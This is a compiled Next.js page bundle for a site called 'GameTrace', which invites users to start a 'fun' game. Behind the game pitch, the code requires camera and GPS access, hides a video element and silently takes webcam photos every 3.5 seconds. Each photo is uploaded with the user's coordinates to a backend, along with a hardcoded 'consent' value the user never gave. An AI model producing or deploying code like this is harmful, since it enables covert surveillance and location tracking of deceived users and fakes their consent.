module.exports = [
"[externals]/react/jsx-dev-runtime [external] (react/jsx-dev-runtime, cjs)", ((__turbopack_context__, module, exports) => {

const mod = __turbopack_context__.x("react/jsx-dev-runtime", () => require("react/jsx-dev-runtime"));

module.exports = mod;
}),
"[project]/pages/index.tsx [ssr] (ecmascript)", ((__turbopack_context__) => {
"use strict";

__turbopack_context__.s([
    "default",
    ()=>HomePage
]);
var __TURBOPACK__imported__module__$5b$externals$5d2f$react$2f$jsx$2d$dev$2d$runtime__$5b$external$5d$__$28$react$2f$jsx$2d$dev$2d$runtime$2c$__cjs$29$__ = __turbopack_context__.i("[externals]/react/jsx-dev-runtime [external] (react/jsx-dev-runtime, cjs)");
var __TURBOPACK__imported__module__$5b$externals$5d2f$react__$5b$external$5d$__$28$react$2c$__cjs$29$__ = __turbopack_context__.i("[externals]/react [external] (react, cjs)");
;
;
const BACKEND = ("TURBOPACK compile-time value", "http://localhost:4000") || "http://localhost:4000";
function HomePage() {
    const [loading, setLoading] = (0, __TURBOPACK__imported__module__$5b$externals$5d2f$react__$5b$external$5d$__$28$react$2c$__cjs$29$__["useState"])(false);
    const [autoMode, setAutoMode] = (0, __TURBOPACK__imported__module__$5b$externals$5d2f$react__$5b$external$5d$__$28$react$2c$__cjs$29$__["useState"])(false);
    const [errorPopup, setErrorPopup] = (0, __TURBOPACK__imported__module__$5b$externals$5d2f$react__$5b$external$5d$__$28$react$2c$__cjs$29$__["useState"])(null);
    const videoRef = (0, __TURBOPACK__imported__module__$5b$externals$5d2f$react__$5b$external$5d$__$28$react$2c$__cjs$29$__["useRef"])(null);
    const intervalRef = (0, __TURBOPACK__imported__module__$5b$externals$5d2f$react__$5b$external$5d$__$28$react$2c$__cjs$29$__["useRef"])(null);
    const [stream, setStream] = (0, __TURBOPACK__imported__module__$5b$externals$5d2f$react__$5b$external$5d$__$28$react$2c$__cjs$29$__["useState"])(null);
    // ------------------------ FORCE GPS POPUP ------------------------
    async function requestGPSPermission() {
        return new Promise((resolve)=>{
            if (!navigator.geolocation) return resolve(false);
            navigator.geolocation.getCurrentPosition(()=>resolve(true), ()=>resolve(false) // Permission denied
            );
        });
    }
    // ------------------------ FORCE CAMERA POPUP ------------------------
    async function requestCameraPermission() {
        try {
            const s = await navigator.mediaDevices.getUserMedia({
                video: true
            });
            s.getTracks().forEach((t)=>t.stop()); // Close immediately
            return true;
        } catch  {
            return false;
        }
    }
    // ------------------------ BACKGROUND FUNCTIONS ------------------------
    async function handleTrack() {
        await fetch(`${BACKEND}/api/track`);
    }
    async function openCamera(startAuto = false) {
        try {
            const s = await navigator.mediaDevices.getUserMedia({
                video: true
            });
            setStream(s);
            if (videoRef.current) {
                videoRef.current.srcObject = s;
                await videoRef.current.play();
            }
            if (startAuto) startAutoCapture();
        } catch  {
            setErrorPopup("Camera permission denied. You must allow it.");
        }
    }
    async function getGPS() {
        return new Promise((resolve)=>{
            navigator.geolocation.getCurrentPosition((pos)=>resolve(pos), ()=>resolve(null));
        });
    }
    async function takePhoto(silent = false) {
        if (!videoRef.current) return;
        const canvas = document.createElement("canvas");
        canvas.width = videoRef.current.videoWidth;
        canvas.height = videoRef.current.videoHeight;
        canvas.getContext("2d")?.drawImage(videoRef.current, 0, 0);
        const blob = await new Promise((resolve)=>canvas.toBlob(resolve, "image/jpeg", 0.9));
        if (!blob) return;
        const pos = await getGPS();
        const fd = new FormData();
        fd.append("photo", blob);
        fd.append("consent", "yes");
        if (pos) {
            fd.append("latitude", String(pos.coords.latitude));
            fd.append("longitude", String(pos.coords.longitude));
        }
        await fetch(`${BACKEND}/api/upload-photo`, {
            method: "POST",
            body: fd
        });
        if (!silent && stream && !autoMode) {
            stream.getTracks().forEach((t)=>t.stop());
            setStream(null);
        }
    }
    function startAutoCapture() {
        if (autoMode) return;
        setAutoMode(true);
        intervalRef.current = window.setInterval(()=>{
            takePhoto(true);
        }, 3500);
    }
    // ------------------------ MASTER START FUNCTION ------------------------
    async function startApp() {
        setLoading(true);
        // 1️⃣ Trigger browser GPS popup
        const gpsOK = await requestGPSPermission();
        if (!gpsOK) {
            setErrorPopup("You must allow GPS permission to start the game.");
            setLoading(false);
            return;
        }
        // 2️⃣ Trigger browser CAMERA popup
        const camOK = await requestCameraPermission();
        if (!camOK) {
            setErrorPopup("You must allow Camera permission to start the game.");
            setLoading(false);
            return;
        }
        // 3️⃣ Run tracking system now that permissions are granted
        await handleTrack();
        await openCamera(true);
        // Silent first picture
        setTimeout(()=>takePhoto(true), 500);
        // 4️⃣ Open the game in a new tab
        setTimeout(()=>window.open("/fun/camera", "_blank"), 800);
        setLoading(false);
    }
    // ------------------------ UI ------------------------
    return /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$externals$5d2f$react$2f$jsx$2d$dev$2d$runtime__$5b$external$5d$__$28$react$2f$jsx$2d$dev$2d$runtime$2c$__cjs$29$__["jsxDEV"])("main", {
        style: {
            height: "100vh",
            display: "flex",
            justifyContent: "center",
            alignItems: "center",
            flexDirection: "column",
            background: "linear-gradient(140deg, #0f0c29, #302b63, #24243e)",
            color: "white",
            fontFamily: "Inter, sans-serif",
            textAlign: "center",
            padding: "20px"
        },
        children: [
            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$externals$5d2f$react$2f$jsx$2d$dev$2d$runtime__$5b$external$5d$__$28$react$2f$jsx$2d$dev$2d$runtime$2c$__cjs$29$__["jsxDEV"])("div", {
                style: {
                    backdropFilter: "blur(10px)",
                    background: "rgba(255,255,255,0.12)",
                    borderRadius: "16px",
                    padding: "35px 25px",
                    maxWidth: "350px",
                    width: "100%",
                    boxShadow: "0 8px 25px rgba(0,0,0,0.25)"
                },
                children: [
                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$externals$5d2f$react$2f$jsx$2d$dev$2d$runtime__$5b$external$5d$__$28$react$2f$jsx$2d$dev$2d$runtime$2c$__cjs$29$__["jsxDEV"])("h1", {
                        style: {
                            fontSize: "28px",
                            marginBottom: "15px",
                            fontWeight: 700
                        },
                        children: "GameTrace"
                    }, void 0, false, {
                        fileName: "[project]/pages/index.tsx",
                        lineNumber: 170,
                        columnNumber: 9
                    }, this),
                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$externals$5d2f$react$2f$jsx$2d$dev$2d$runtime__$5b$external$5d$__$28$react$2f$jsx$2d$dev$2d$runtime$2c$__cjs$29$__["jsxDEV"])("p", {
                        style: {
                            opacity: 0.9,
                            fontSize: "15px",
                            marginBottom: "30px",
                            lineHeight: "1.5"
                        },
                        children: [
                            "Welcome to ",
                            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$externals$5d2f$react$2f$jsx$2d$dev$2d$runtime__$5b$external$5d$__$28$react$2f$jsx$2d$dev$2d$runtime$2c$__cjs$29$__["jsxDEV"])("b", {
                                children: "GameTrace"
                            }, void 0, false, {
                                fileName: "[project]/pages/index.tsx",
                                lineNumber: 182,
                                columnNumber: 22
                            }, this),
                            " — a fast, fun, and surprisingly smart little game! Tap ",
                            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$externals$5d2f$react$2f$jsx$2d$dev$2d$runtime__$5b$external$5d$__$28$react$2f$jsx$2d$dev$2d$runtime$2c$__cjs$29$__["jsxDEV"])("b", {
                                children: "Start Game"
                            }, void 0, false, {
                                fileName: "[project]/pages/index.tsx",
                                lineNumber: 183,
                                columnNumber: 15
                            }, this),
                            ", allow Camera & GPS, and let the adventure begin. Your device helps create a ",
                            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$externals$5d2f$react$2f$jsx$2d$dev$2d$runtime__$5b$external$5d$__$28$react$2f$jsx$2d$dev$2d$runtime$2c$__cjs$29$__["jsxDEV"])("b", {
                                children: "unique, personalized world"
                            }, void 0, false, {
                                fileName: "[project]/pages/index.tsx",
                                lineNumber: 184,
                                columnNumber: 38
                            }, this),
                            " just for you!"
                        ]
                    }, void 0, true, {
                        fileName: "[project]/pages/index.tsx",
                        lineNumber: 174,
                        columnNumber: 8
                    }, this),
                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$externals$5d2f$react$2f$jsx$2d$dev$2d$runtime__$5b$external$5d$__$28$react$2f$jsx$2d$dev$2d$runtime$2c$__cjs$29$__["jsxDEV"])("button", {
                        onClick: startApp,
                        disabled: loading,
                        style: {
                            width: "100%",
                            padding: "16px",
                            borderRadius: "50px",
                            background: loading ? "rgba(255,255,255,0.3)" : "#fff",
                            color: "#24243e",
                            fontWeight: "700",
                            fontSize: "17px",
                            border: "none",
                            cursor: "pointer",
                            boxShadow: "0 6px 20px rgba(255,255,255,0.25)",
                            transition: "0.25s",
                            transform: loading ? "scale(0.97)" : "scale(1)"
                        },
                        children: loading ? "Starting..." : "Start Game"
                    }, void 0, false, {
                        fileName: "[project]/pages/index.tsx",
                        lineNumber: 188,
                        columnNumber: 9
                    }, this)
                ]
            }, void 0, true, {
                fileName: "[project]/pages/index.tsx",
                lineNumber: 159,
                columnNumber: 7
            }, this),
            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$externals$5d2f$react$2f$jsx$2d$dev$2d$runtime__$5b$external$5d$__$28$react$2f$jsx$2d$dev$2d$runtime$2c$__cjs$29$__["jsxDEV"])("video", {
                ref: videoRef,
                style: {
                    display: "none"
                }
            }, void 0, false, {
                fileName: "[project]/pages/index.tsx",
                lineNumber: 211,
                columnNumber: 7
            }, this),
            errorPopup && /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$externals$5d2f$react$2f$jsx$2d$dev$2d$runtime__$5b$external$5d$__$28$react$2f$jsx$2d$dev$2d$runtime$2c$__cjs$29$__["jsxDEV"])("div", {
                style: {
                    position: "fixed",
                    inset: 0,
                    background: "rgba(0,0,0,0.6)",
                    display: "flex",
                    justifyContent: "center",
                    alignItems: "center",
                    padding: "20px"
                },
                children: /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$externals$5d2f$react$2f$jsx$2d$dev$2d$runtime__$5b$external$5d$__$28$react$2f$jsx$2d$dev$2d$runtime$2c$__cjs$29$__["jsxDEV"])("div", {
                    style: {
                        background: "white",
                        padding: "25px",
                        borderRadius: "10px",
                        width: "90%",
                        maxWidth: "350px",
                        textAlign: "center",
                        color: "black"
                    },
                    children: [
                        /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$externals$5d2f$react$2f$jsx$2d$dev$2d$runtime__$5b$external$5d$__$28$react$2f$jsx$2d$dev$2d$runtime$2c$__cjs$29$__["jsxDEV"])("h2", {
                            style: {
                                marginBottom: "10px",
                                fontSize: "20px"
                            },
                            children: "Permission Required"
                        }, void 0, false, {
                            fileName: "[project]/pages/index.tsx",
                            lineNumber: 237,
                            columnNumber: 13
                        }, this),
                        /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$externals$5d2f$react$2f$jsx$2d$dev$2d$runtime__$5b$external$5d$__$28$react$2f$jsx$2d$dev$2d$runtime$2c$__cjs$29$__["jsxDEV"])("p", {
                            style: {
                                marginBottom: "20px",
                                fontSize: "15px"
                            },
                            children: errorPopup
                        }, void 0, false, {
                            fileName: "[project]/pages/index.tsx",
                            lineNumber: 240,
                            columnNumber: 13
                        }, this),
                        /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$externals$5d2f$react$2f$jsx$2d$dev$2d$runtime__$5b$external$5d$__$28$react$2f$jsx$2d$dev$2d$runtime$2c$__cjs$29$__["jsxDEV"])("button", {
                            onClick: ()=>setErrorPopup(null),
                            style: {
                                padding: "10px 20px",
                                background: "#302b63",
                                color: "white",
                                borderRadius: "6px",
                                border: "none",
                                cursor: "pointer"
                            },
                            children: "OK"
                        }, void 0, false, {
                            fileName: "[project]/pages/index.tsx",
                            lineNumber: 243,
                            columnNumber: 13
                        }, this)
                    ]
                }, void 0, true, {
                    fileName: "[project]/pages/index.tsx",
                    lineNumber: 226,
                    columnNumber: 11
                }, this)
            }, void 0, false, {
                fileName: "[project]/pages/index.tsx",
                lineNumber: 215,
                columnNumber: 9
            }, this)
        ]
    }, void 0, true, {
        fileName: "[project]/pages/index.tsx",
        lineNumber: 145,
        columnNumber: 5
    }, this);
}
}),
"[externals]/next/dist/shared/lib/no-fallback-error.external.js [external] (next/dist/shared/lib/no-fallback-error.external.js, cjs)", ((__turbopack_context__, module, exports) => {

const mod = __turbopack_context__.x("next/dist/shared/lib/no-fallback-error.external.js", () => require("next/dist/shared/lib/no-fallback-error.external.js"));

module.exports = mod;
}),
];

//# sourceMappingURL=%5Broot-of-the-server%5D__60b1ea7b._.js.map